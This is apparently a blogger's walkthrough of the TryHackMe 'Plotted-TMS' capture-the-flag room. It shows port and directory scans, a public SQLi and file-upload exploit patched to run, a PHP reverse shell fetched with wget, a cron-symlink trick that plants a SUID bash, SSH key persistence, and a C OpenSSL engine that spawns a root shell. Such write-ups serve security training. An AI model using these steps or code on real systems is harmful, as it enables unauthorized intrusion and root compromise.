---
title: Walkthrough - Plotted-TMS
published: true
---

Tags: Security, Linux, RCE, PrivEsc, Linking
Description: Everything here is plotted!
Difficulty: Easy
URL: [https://tryhackme.com/room/plottedtms](https://tryhackme.com/room/plottedtms)

* * *

## Notes

- `sudo nmap -Pn -sS -T4 -p- 10.10.154.213 -vvv`
- `sudo nmap -sC -sV -sT -O -p22,80,445 10.10.154.213`

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- `gobuster dir -u http://10.10.154.213 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html -t 100 --no-error`

Port 80 contains a few different folders

```
/admin                (Status: 301) [Size: 314] [--> http://10.10.154.213/admin/]
/shadow               (Status: 200) [Size: 25]                                   
/passwd               (Status: 200) [Size: 25]   
```

- `/passwd` and `/shadow` contain a base64 message `bm90IHRoaXMgZWFzeSA6RA==` 

```
┌──(0xskar㉿cocokali)-[~]
└─$ echo "bm90IHRoaXMgZWFzeSA6RA==" | base64 -d                  
not this easy :D  
```

- `/admin` contains an `id_rsa` file - `Trust me it is not this easy..now get back to enumeration :D`

Dead end port 80. onto port 445:

- `gobuster dir -u http://10.10.102.139:445/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html -t 100 --no-error`

Port 445 has a `/management` directory with an admin portal `/management/admin/login.php`.

Checking out the [source](https://www.sourcecodester.com/php/14909/online-traffic-offense-management-system-php-free-source-code.html) of this management system the default credentials `admin:admin123` 

Capturing the request in burpsuite we can see that SQLi is possible, and there are also few exploits in exploitdb we can use. 

- `python2 50221.py`
- `http://10.10.137.125:445/management/`

Running the script and trying gets us connected but doesnt ewrurn us anything and we can see some errors when we try to run commands.

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/plotted-tms]
└─$ python2 50221.py

Example: http://example.com

Url: http://10.10.137.125:445/management/
Check Url ...

[+] Bypass Login

[+] Upload Shell

[+] Exploit Done!

$ id
Traceback (most recent call last):
  File "50221.py", line 107, in <module>
    request = requests.post(find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 119, in post
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 61, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 516, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 459, in prepare_request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/models.py", line 314, in prepare
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/models.py", line 388, in prepare_url
requests.exceptions.MissingSchema: Invalid URL '/management/uploads/1660858140_evil.php?cmd=id': No schema supplied. Perhaps you meant http:///management/uploads/1660858140_evil.php?cmd=id?
```

modifying the exploit lets us properly run it. adding the direct url to the request

```
        while True:
            cmd = raw_input("$ ")
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'}
            request = requests.post("http://10.10.137.125:445"+find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
            print request.text.replace("<pre>" ,"").replace("</pre>", "")
            time.sleep(1)
```

we can now get a reverse shell by using nc 

- start up pwncat listenr `pwncat-cs -lp 6666`
- the nc mkfifo diesnt seem to work so i wget over a php reverse shell pentestmoney.
- access it at http://10.10.137.125:445/management/uploads/php-reverse-shell.php and recieve the rev shell

* * * 

## What is the content of user.txt?

- `cat /etc/crontab`

plot_admin is running a script 

```
(remote) www-data@plotted:/$ cat /var/www/scripts/backup.sh 
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```

1. create a script that copies bash to a shell than changes the files mode bits so it can be executed `echo "cp /bin/bash /home/plot_admin/pa_shell; chmod +xs /home/plot_admin/pa_shell" > script.sh`
2. change mode bits of script so it can be executed `chmod +x script.sh`
3. make a symbolic force link between the created script.sh with the bash and the plot_admins backup.sh `ln -sf script.sh backup.sh`
4. run the shell to get escalate to plot_admin `/home/plot_admin/pa_shell -p`

![0xskar](/assets/plotted-tms01.png)

add our ssh key to the user dir so we can ssh in as the user.

1. `mkdir .ssh && chmod 0700 .ssh`
2. on attacker ssh-keygen new key
3. `echo "sshkey" > .ssh/authorized_keys` && `chmod 0600`
4. ssh in

* * * 

## What is the content of root.txt?

```
╔══════════╣ Checking doas.conf
permit nopass plot_admin as root cmd openssl 
```

since we can run openssl as root create lets creat an exploit to take advantage

```
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

![0xskar](/assets/plotted-tms02.png)

* * * 

